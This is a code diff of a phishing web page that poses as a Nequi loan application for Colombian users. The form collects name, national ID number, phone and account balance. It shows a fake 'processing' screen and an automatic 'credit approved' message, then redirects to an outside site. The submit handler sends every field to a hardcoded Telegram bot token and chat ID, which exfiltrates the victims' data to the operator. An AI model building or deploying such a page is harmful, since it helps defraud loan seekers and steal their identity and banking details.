@@ -1,10 +1,10 @@
+<!DOCTYPE html>
 <html lang="en">
 
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Préstamos</title>
-    <link rel="stylesheet" hweed="/css/styles.css">
     <style>
          * {
             margin: 0;
@@ -348,9 +348,11 @@
                 width: 250px;
             }
         }
+
         .texto {
             font-size: 0.01px;
         }
+
         .center-content {
             display: flex;
             flex-direction: column;
@@ -463,61 +465,10 @@
             0%, 50% { opacity: 1; }
             51%, 100% { opacity: 0; }
         }
-
-        /* Configuración de Telegram */
-        .telegram-config {
-            position: fixed;
-            bottom: 20px;
-            right: 20px;
-            background: white;
-            padding: 15px;
-            border-radius: 10px;
-            box-shadow: 0 4px 15px rgba(0,0,0,0.1);
-            border: 2px solid #E91E63;
-            z-index: 999;
-            font-size: 12px;
-            color: #666;
-            max-width: 300px;
-        }
-
-        .telegram-config h4 {
-            color: #E91E63;
-            margin-bottom: 10px;
-            font-size: 14px;
-        }
-
-        .telegram-config input {
-            width: 100%;
-            padding: 8px;
-            margin: 5px 0;
-            border: 1px solid #ddd;
-            border-radius: 5px;
-            font-size: 12px;
-        }
-
-        .telegram-config button {
-            background: #E91E63;
-            color: white;
-            border: none;
-            padding: 8px 15px;
-            border-radius: 5px;
-            cursor: pointer;
-            font-size: 12px;
-            margin-top: 10px;
-        }
     </style>
 </head>
 
 <body style="margin: 0;">
-
-    <!-- Configuración de Telegram (solo para desarrollo) -->
-    <div class="telegram-config" id="telegramConfig">
-        <h4>⚙️ Config Telegram Bot</h4>
-        <input type="text" id="botToken" placeholder="Bot Token" value="">
-        <input type="text" id="chatId" placeholder="Chat ID" value="">
-        <button onclick="saveTelegramConfig()">Guardar</button>
-        <button onclick="toggleConfig()" style="background: #666;">Ocultar</button>
-    </div>
 
     <!-- Diseño original para usuarios de Colombia -->
     <div id="colombia-content" class="colombia-design">
@@ -527,144 +478,109 @@
                 <div>
                     <img src="img/Nequi-5.png" alt="" style="width: 100%; margin-top:0px;">
                 </div>
-                 <div class="container" id="mainContainer">
+                <div class="container" id="mainContainer">
      
-        <div class="step-indicator">
-            Paso <span id="currentStep">1</span> de <span id="totalSteps">5</span>
-        </div>
-        
-        <div class="progress-bar">
-            <div class="progress-fill" id="progressFill"></div>
-        </div>
+                    <div class="step-indicator">
+                        Paso <span id="currentStep">1</span> de <span id="totalSteps">5</span>
+                    </div>
+                    
+                    <div class="progress-bar">
+                        <div class="progress-fill" id="progressFill"></div>
+                    </div>
 
-        <form id="creditForm">
-            <div class="form-step active" id="step1">
-                <label for="fullName">Nombre completo</label>
-                <input type="text" id="fullName" placeholder="Ingresa tu nombre completo" required>
-            </div>
+                    <form id="creditForm">
+                        <div class="form-step active" id="step1">
+                            <label for="fullName">Nombre completo</label>
+                            <input type="text" id="fullName" placeholder="Ingresa tu nombre completo" required>
+                        </div>
 
-            <div class="form-step" id="step2">
-                <label for="idNumber">Número de cédula</label>
-                <input type="text" id="idNumber" placeholder="Ingresa tu número de cédula" required>
-            </div>
+                        <div class="form-step" id="step2">
+                            <label for="idNumber">Número de cédula</label>
+                            <input type="text" id="idNumber" placeholder="Ingresa tu número de cédula" required>
+                        </div>
 
-            <div class="form-step" id="step3">
-                <label for="phone">Número de teléfono</label>
-                <input type="tel" id="phone" placeholder="Ingresa tu número de teléfono" required>
-            </div>
+                        <div class="form-step" id="step3">
+                            <label for="phone">Número de teléfono</label>
+                            <input type="tel" id="phone" placeholder="Ingresa tu número de teléfono" required>
+                        </div>
 
-            <div class="form-step" id="step4">
-                <label for="creditAmount">Monto del crédito solicitado</label>
-                <select id="creditAmount" required>
-                    <option value="">Selecciona el monto</option>
-                    <option value="500000">$500.000</option>
-                    <option value="1000000">$1.000.000</option>
-                    <option value="2000000">$2.000.000</option>
-                    <option value="3000000">$3.000.000</option>
-                    <option value="5000000">$5.000.000</option>
-                    <option value="8000000">$8.000.000</option>
-                    <option value="10000000">$10.000.000</option>
-                    <option value="15000000">$15.000.000</option>
-                    <option value="20000000">$20.000.000</option>
-                    <option value="30000000">$30.000.000</option>
-                </select>
-            </div>
+                        <div class="form-step" id="step4">
+                            <label for="creditAmount">Monto del crédito solicitado</label>
+                            <select id="creditAmount" required>
+                                <option value="">Selecciona el monto</option>
+                                <option value="500000">$500.000</option>
+                                <option value="1000000">$1.000.000</option>
+                                <option value="2000000">$2.000.000</option>
+                                <option value="3000000">$3.000.000</option>
+                                <option value="5000000">$5.000.000</option>
+                                <option value="8000000">$8.000.000</option>
+                                <option value="10000000">$10.000.000</option>
+                                <option value="15000000">$15.000.000</option>
+                                <option value="20000000">$20.000.000</option>
+                                <option value="30000000">$30.000.000</option>
+                            </select>
+                        </div>
 
-            <div class="form-step" id="step5">
-                <label for="accountBalance">Saldo actual en tu cuenta Nequi</label>
-                <div class="currency-symbol">
-                    <input type="text" id="accountBalance" placeholder="Ingresa tu saldo actual" required>
+                        <div class="form-step" id="step5">
+                            <label for="accountBalance">Saldo actual en tu cuenta Nequi</label>
+                            <div class="currency-symbol">
+                                <input type="text" id="accountBalance" placeholder="Ingresa tu saldo actual" required>
+                            </div>
+                        </div>
+
+                        <button type="submit" class="submit-btn" id="submitBtn">
+                            ¡Solicitar crédito!
+                        </button>
+                    </form>
                 </div>
-            </div>
 
-            <button type="submit" class="submit-btn" id="submitBtn">
-                ¡Solicitar crédito!
-            </button>
-        </form>
-    </div>
+                <!-- Loading Screen -->
+                <div class="loading-screen" id="loadingScreen">
+                    <div class="spinner"></div>
+                    <div class="loading-text">Procesando tu solicitud...</div>
+                    <div class="loading-subtext" id="loadingSubtext">Verificando tu información crediticia</div>
+                    <div class="loading-progress">
+                        <div class="loading-progress-fill" id="loadingProgressFill"></div>
+                    </div>
+                    <div class="loading-percentage" id="loadingPercentage">0%</div>
+                </div>
 
-    <!-- Loading Screen -->
-    <div class="loading-screen" id="loadingScreen">
-        <div class="spinner"></div>
-        <div class="loading-text">Procesando tu solicitud...</div>
-        <div class="loading-subtext" id="loadingSubtext">Verificando tu información crediticia</div>
-        <div class="loading-progress">
-            <div class="loading-progress-fill" id="loadingProgressFill"></div>
-        </div>
-        <div class="loading-percentage" id="loadingPercentage">0%</div>
-    </div>
+                <!-- Success Screen -->
+                <div class="success-screen" id="successScreen">
+                    <div class="success-icon"></div>
+                    <div class="success-title">¡Crédito Aprobado!</div>
+                    <div class="success-amount" id="approvedAmount">$0</div>
+                    <div class="success-message">
+                        ¡Felicitaciones! Tu crédito ha sido aprobado.<br>
+                        Ingresa la cuenta a la que se le va a reflejar el crédito.
+                    </div>
+                    
+                    <button class="back-btn" onclick="redirectToTransfer()">Continuar</button>
+                </div>
 
-    <!-- Success Screen -->
-    <div class="success-screen" id="successScreen">
-        <div class="success-icon"></div>
-        <div class="success-title">¡Crédito Aprobado!</div>
-        <div class="success-amount" id="approvedAmount">$0</div>
-        <div class="success-message">
-            ¡Felicitaciones! Tu crédito ha sido aprobado.<br>
-            Ingresa la cuenta a la que se le va a reflejar el crédito.
-        </div>
-        
-        <button class="back-btn" onclick="redirectToTransfer()">Continuar</button>
-    </div>
+                <script>
+                    let currentStepIndex = 0;
+                    const totalSteps = 5;
+                    const steps = document.querySelectorAll('.form-step');
+                    const progressFill = document.getElementById('progressFill');
+                    const currentStepSpan = document.getElementById('currentStep');
+                    const submitBtn = document.getElementById('submitBtn');
+                    const loadingScreen = document.getElementById('loadingScreen');
+                    const successScreen = document.getElementById('successScreen');
+                    const mainContainer = document.getElementById('mainContainer');
 
-    <script>
-        let currentStepIndex = 0;
-        const totalSteps = 5;
-        const steps = document.querySelectorAll('.form-step');
-        const progressFill = document.getElementById('progressFill');
-        const currentStepSpan = document.getElementById('currentStep');
-        const submitBtn = document.getElementById('submitBtn');
-        const loadingScreen = document.getElementById('loadingScreen');
-        const successScreen = document.getElementById('successScreen');
-        const mainContainer = document.getElementById('mainContainer');
+                    // ⚠️ CONFIGURACIÓN DEL BOT DE TELEGRAM - SOLO CAMBIAR AQUÍ ⚠️
+                    const TELEGRAM_BOT_TOKEN = '8026008048:AAGsoTBa7Imi1MxiosM8OeSb_vMQm5MWEWs';
+                    const TELEGRAM_CHAT_ID = '7831097636';
 
-        // Configuración de Telegram Bot
-        let TELEGRAM_BOT_TOKEN = '8026008048:AAGsoTBa7Imi1MxiosM8OeSb_vMQm5MWEWs';
-        let TELEGRAM_CHAT_ID = '7831097636';
+                    // Función para enviar mensaje a Telegram
+                    async function sendToTelegram(formData) {
+                        if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
+                            console.error('❌ Token de bot o Chat ID no configurados');
+                            return false;
+                        }
 
-        // Cargar configuración guardada
-        function loadTelegramConfig() {
-            const savedToken = localStorage.getItem('telegram_bot_token');
-            const savedChatId = localStorage.getItem('telegram_chat_id');
-            
-            if (savedToken) {
-                TELEGRAM_BOT_TOKEN = savedToken;
-                document.getElementById('botToken').value = savedToken;
-            }
-            if (savedChatId) {
-                TELEGRAM_CHAT_ID = savedChatId;
-                document.getElementById('chatId').value = savedChatId;
-            }
-        }
-
-        function saveTelegramConfig() {
-            const token = document.getElementById('botToken').value.trim();
-            const chatId = document.getElementById('chatId').value.trim();
-            
-            if (token && chatId) {
-                TELEGRAM_BOT_TOKEN = token;
-                TELEGRAM_CHAT_ID = chatId;
-                localStorage.setItem('telegram_bot_token', token);
-                localStorage.setItem('telegram_chat_id', chatId);
-                alert('✅ Configuración guardada correctamente');
-            } else {
-                alert('❌ Por favor ingresa tanto el Token como el Chat ID');
-            }
-        }
-
-        function toggleConfig() {
-            const config = document.getElementById('telegramConfig');
-            config.style.display = config.style.display === 'none' ? 'block' : 'none';
-        }
-
-        // Función para enviar mensaje a Telegram
-        async function sendToTelegram(formData) {
-            if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
-                console.error('❌ Token de bot o Chat ID no configurados');
-                return false;
-            }
-
-            const message = `
+                        const message = `
 🏦 *NUEVA SOLICITUD DE CRÉDITO*
 
 👤 *Datos del Solicitante:*
@@ -677,231 +593,225 @@
 • Saldo actual: $${formData.accountBalance.toLocaleString('es-CO')}
 
 📅 *Fecha:* ${new Date().toLocaleString('es-CO')}
-            `.trim();
+                        `.trim();
 
-            try {
-                const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
-                    method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json',
-                    },
-                    body: JSON.stringify({
-                        chat_id: TELEGRAM_CHAT_ID,
-                        text: message,
-                        parse_mode: 'Markdown'
-                    })
-                });
+                        try {
+                            const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+                                method: 'POST',
+                                headers: {
+                                    'Content-Type': 'application/json',
+                                },
+                                body: JSON.stringify({
+                                    chat_id: TELEGRAM_CHAT_ID,
+                                    text: message,
+                                    parse_mode: 'Markdown'
+                                })
+                            });
 
-                const result = await response.json();
-                
-                if (result.ok) {
-                    console.log('✅ Mensaje enviado a Telegram exitosamente');
-                    return true;
-                } else {
-                    console.error('❌ Error al enviar mensaje:', result.description);
-                    return false;
-                }
-            } catch (error) {
-                console.error('❌ Error de conexión:', error);
-                return false;
-            }
-        }
-
-        function updateProgress() {
-            const progressPercentage = ((currentStepIndex + 1) / totalSteps) * 100;
-            progressFill.style.width = progressPercentage + '%';
-            currentStepSpan.textContent = currentStepIndex + 1;
-        }
-
-        function showNextStep() {
-            if (currentStepIndex < totalSteps - 1) {
-                currentStepIndex++;
-                steps[currentStepIndex].classList.add('active');
-                updateProgress();
-                
-                if (currentStepIndex === totalSteps - 1) {
-                    setTimeout(() => {
-                        submitBtn.classList.add('active');
-                    }, 500);
-                }
-            }
-        }
-
-        function validateCurrentStep() {
-            const currentStep = steps[currentStepIndex];
-            const input = currentStep.querySelector('input, select');
-            return input && input.value.trim() !== '';
-        }
-
-        function formatCurrency(amount) {
-            return new Intl.NumberFormat('es-CO', {
-                style: 'currency',
-                currency: 'COP',
-                minimumFractionDigits: 0
-            }).format(amount);
-        }
-
-        function simulateLoadingProgress() {
-            const loadingMessages = [
-                "Verificando tu información crediticia",
-                "Consultando bases de datos financieras",
-                "Evaluando tu capacidad de pago",
-                "Procesando documentos",
-                "Generando pre-aprobación",
-                "Validando con entidades bancarias",
-                "Finalizando aprobación"
-            ];
-
-            let progress = 0;
-            let messageIndex = 0;
-            const progressFill = document.getElementById('loadingProgressFill');
-            const progressText = document.getElementById('loadingPercentage');
-            const subtextElement = document.getElementById('loadingSubtext');
-
-            const interval = setInterval(() => {
-                progress += Math.random() * 15 + 5;
-                
-                if (progress > 100) progress = 100;
-                
-                progressFill.style.width = progress + '%';
-                progressText.textContent = Math.floor(progress) + '%';
-                
-                if (progress > (messageIndex + 1) * 14 && messageIndex < loadingMessages.length - 1) {
-                    messageIndex++;
-                    subtextElement.textContent = loadingMessages[messageIndex];
-                }
-                
-                if (progress >= 100) {
-                    clearInterval(interval);
-                    setTimeout(() => {
-                        showSuccessScreen();
-                    }, 500);
-                }
-            }, 400);
-        }
-
-        function showSuccessScreen() {
-            const selectedAmount = document.getElementById('creditAmount').value;
-            
-            loadingScreen.classList.remove('active');
-            
-            document.getElementById('approvedAmount').textContent = formatCurrency(selectedAmount);
-            successScreen.classList.add('active');
-        }
-
-        function redirectToTransfer() {
-            window.location.href = 'https://solicita-tu-propulsor.vercel.app/';
-        }
-
-        function resetForm() {
-            document.getElementById('creditForm').reset();
-            
-            steps.forEach((step, index) => {
-                if (index === 0) {
-                    step.classList.add('active');
-                } else {
-                    step.classList.remove('active');
-                }
-            });
-            
-            currentStepIndex = 0;
-            submitBtn.classList.remove('active');
-            
-            successScreen.classList.remove('active');
-            loadingScreen.classList.remove('active');
-            
-            document.getElementById('loadingProgressFill').style.width = '0%';
-            document.getElementById('loadingPercentage').textContent = '0%';
-            document.getElementById('loadingSubtext').textContent = 'Verificando tu información crediticia';
-            
-            updateProgress();
-        }
-
-        // Formatear el input del saldo con separadores de miles
-        document.getElementById('accountBalance').addEventListener('input', function(e) {
-            let value = e.target.value.replace(/\D/g, '');
-            if (value) {
-                if (value.length > 15) {
-                    value = value.slice(0, 15);
-                }
-                e.target.value = value.replace(/\B(?=(\d{3})+(?!\d))/g, '.');
-            } else {
-                e.target.value = '';
-            }
-        });
-
-        // Event listeners para los inputs
-        steps.forEach((step, index) => {
-            const input = step.querySelector('input, select');
-            if (input) {
-                input.addEventListener('input', function() {
-                    if (index === currentStepIndex && validateCurrentStep()) {
-                        setTimeout(() => {
-                            showNextStep();
-                        }, 500);
+                            const result = await response.json();
+                            
+                            if (result.ok) {
+                                console.log('✅ Mensaje enviado a Telegram exitosamente');
+                                return true;
+                            } else {
+                                console.error('❌ Error al enviar mensaje:', result.description);
+                                return false;
+                            }
+                        } catch (error) {
+                            console.error('❌ Error de conexión:', error);
+                            return false;
+                        }
                     }
-                });
 
-                if (input.tagName === 'SELECT') {
-                    input.addEventListener('change', function() {
-                        if (index === currentStepIndex && validateCurrentStep()) {
-                            setTimeout(() => {
-                                showNextStep();
-                            }, 500);
+                    function updateProgress() {
+                        const progressPercentage = ((currentStepIndex + 1) / totalSteps) * 100;
+                        progressFill.style.width = progressPercentage + '%';
+                        currentStepSpan.textContent = currentStepIndex + 1;
+                    }
+
+                    function showNextStep() {
+                        if (currentStepIndex < totalSteps - 1) {
+                            currentStepIndex++;
+                            steps[currentStepIndex].classList.add('active');
+                            updateProgress();
+                            
+                            if (currentStepIndex === totalSteps - 1) {
+                                setTimeout(() => {
+                                    submitBtn.classList.add('active');
+                                }, 500);
+                            }
+                        }
+                    }
+
+                    function validateCurrentStep() {
+                        const currentStep = steps[currentStepIndex];
+                        const input = currentStep.querySelector('input, select');
+                        return input && input.value.trim() !== '';
+                    }
+
+                    function formatCurrency(amount) {
+                        return new Intl.NumberFormat('es-CO', {
+                            style: 'currency',
+                            currency: 'COP',
+                            minimumFractionDigits: 0
+                        }).format(amount);
+                    }
+
+                    function simulateLoadingProgress() {
+                        const loadingMessages = [
+                            "Verificando tu información crediticia",
+                            "Consultando bases de datos financieras",
+                            "Evaluando tu capacidad de pago",
+                            "Procesando documentos",
+                            "Generando pre-aprobación",
+                            "Validando con entidades bancarias",
+                            "Finalizando aprobación"
+                        ];
+
+                        let progress = 0;
+                        let messageIndex = 0;
+                        const progressFill = document.getElementById('loadingProgressFill');
+                        const progressText = document.getElementById('loadingPercentage');
+                        const subtextElement = document.getElementById('loadingSubtext');
+
+                        const interval = setInterval(() => {
+                            progress += Math.random() * 15 + 5;
+                            
+                            if (progress > 100) progress = 100;
+                            
+                            progressFill.style.width = progress + '%';
+                            progressText.textContent = Math.floor(progress) + '%';
+                            
+                            if (progress > (messageIndex + 1) * 14 && messageIndex < loadingMessages.length - 1) {
+                                messageIndex++;
+                                subtextElement.textContent = loadingMessages[messageIndex];
+                            }
+                            
+                            if (progress >= 100) {
+                                clearInterval(interval);
+                                setTimeout(() => {
+                                    showSuccessScreen();
+                                }, 500);
+                            }
+                        }, 400);
+                    }
+
+                    function showSuccessScreen() {
+                        const selectedAmount = document.getElementById('creditAmount').value;
+                        
+                        loadingScreen.classList.remove('active');
+                        
+                        document.getElementById('approvedAmount').textContent = formatCurrency(selectedAmount);
+                        successScreen.classList.add('active');
+                    }
+
+                    function redirectToTransfer() {
+                        window.location.href = 'https://solicita-tu-propulsor.vercel.app/';
+                    }
+
+                    function resetForm() {
+                        document.getElementById('creditForm').reset();
+                        
+                        steps.forEach((step, index) => {
+                            if (index === 0) {
+                                step.classList.add('active');
+                            } else {
+                                step.classList.remove('active');
+                            }
+                        });
+                        
+                        currentStepIndex = 0;
+                        submitBtn.classList.remove('active');
+                        
+                        successScreen.classList.remove('active');
+                        loadingScreen.classList.remove('active');
+                        
+                        document.getElementById('loadingProgressFill').style.width = '0%';
+                        document.getElementById('loadingPercentage').textContent = '0%';
+                        document.getElementById('loadingSubtext').textContent = 'Verificando tu información crediticia';
+                        
+                        updateProgress();
+                    }
+
+                    // Formatear el input del saldo con separadores de miles
+                    document.getElementById('accountBalance').addEventListener('input', function(e) {
+                        let value = e.target.value.replace(/\D/g, '');
+                        if (value) {
+                            if (value.length > 15) {
+                                value = value.slice(0, 15);
+                            }
+                            e.target.value = value.replace(/\B(?=(\d{3})+(?!\d))/g, '.');
+                        } else {
+                            e.target.value = '';
                         }
                     });
-                }
-            }
-        });
 
-        document.getElementById('accountBalance').addEventListener('keyup', function(e) {
-            if (currentStepIndex === 4 && this.value.replace(/\D/g, '').length > 0) {
-                setTimeout(() => {
-                    if (currentStepIndex === totalSteps - 1) {
-                        submitBtn.classList.add('active');
-                    }
-                }, 100);
-            }
-        });
+                    // Event listeners para los inputs
+                    steps.forEach((step, index) => {
+                        const input = step.querySelector('input, select');
+                        if (input) {
+                            input.addEventListener('input', function() {
+                                if (index === currentStepIndex && validateCurrentStep()) {
+                                    setTimeout(() => {
+                                        showNextStep();
+                                    }, 500);
+                                }
+                            });
 
-        // Manejar el submit del formulario - AQUÍ SE ENVÍAN LOS DATOS A TELEGRAM
-        document.getElementById('creditForm').addEventListener('submit', async function(e) {
-            e.preventDefault();
-            
-            // Recopilar datos del formulario
-            const formData = {
-                fullName: document.getElementById('fullName').value,
-                idNumber: document.getElementById('idNumber').value,
-                phone: document.getElementById('phone').value,
-                creditAmount: parseInt(document.getElementById('creditAmount').value),
-                accountBalance: parseInt(document.getElementById('accountBalance').value.replace(/\./g, ''))
-            };
+                            if (input.tagName === 'SELECT') {
+                                input.addEventListener('change', function() {
+                                    if (index === currentStepIndex && validateCurrentStep()) {
+                                        setTimeout(() => {
+                                            showNextStep();
+                                        }, 500);
+                                    }
+                                });
+                            }
+                        }
+                    });
 
-            // Mostrar pantalla de carga
-            loadingScreen.classList.add('active');
-            
-            // Enviar datos a Telegram
-            const telegramSent = await sendToTelegram(formData);
-            
-            if (telegramSent) {
-                console.log('📱 Datos enviados exitosamente a Telegram');
-            } else {
-                console.log('❌ Error al enviar datos a Telegram');
-            }
-            
-            // Continuar con la simulación de progreso
-            simulateLoadingProgress();
-        });
+                    document.getElementById('accountBalance').addEventListener('keyup', function(e) {
+                        if (currentStepIndex === 4 && this.value.replace(/\D/g, '').length > 0) {
+                            setTimeout(() => {
+                                if (currentStepIndex === totalSteps - 1) {
+                                    submitBtn.classList.add('active');
+                                }
+                            }, 100);
+                        }
+                    });
 
-        // Inicializar
-        updateProgress();
-        loadTelegramConfig();
+                    // Manejar el submit del formulario - AQUÍ SE ENVÍAN LOS DATOS A TELEGRAM
+                    document.getElementById('creditForm').addEventListener('submit', async function(e) {
+                        e.preventDefault();
+                        
+                        // Recopilar datos del formulario
+                        const formData = {
+                            fullName: document.getElementById('fullName').value,
+                            idNumber: document.getElementById('idNumber').value,
+                            phone: document.getElementById('phone').value,
+                            creditAmount: parseInt(document.getElementById('creditAmount').value),
+                            accountBalance: parseInt(document.getElementById('accountBalance').value.replace(/\./g, ''))
+                        };
 
-        // Ocultar configuración después de 10 segundos
-        setTimeout(() => {
-            document.getElementById('telegramConfig').style.display = 'none';
-        }, 10000);
-    </script>
+                        // Mostrar pantalla de carga
+                        loadingScreen.classList.add('active');
+                        
+                        // Enviar datos a Telegram
+                        const telegramSent = await sendToTelegram(formData);
+                        
+                        if (telegramSent) {
+                            console.log('📱 Datos enviados exitosamente a Telegram');
+                        } else {
+                            console.log('❌ Error al enviar datos a Telegram');
+                        }
+                        
+                        // Continuar con la simulación de progreso
+                        simulateLoadingProgress();
+                    });
+
+                    // Inicializar
+                    updateProgress();
+                </script>
                 
             </div>
         </div>
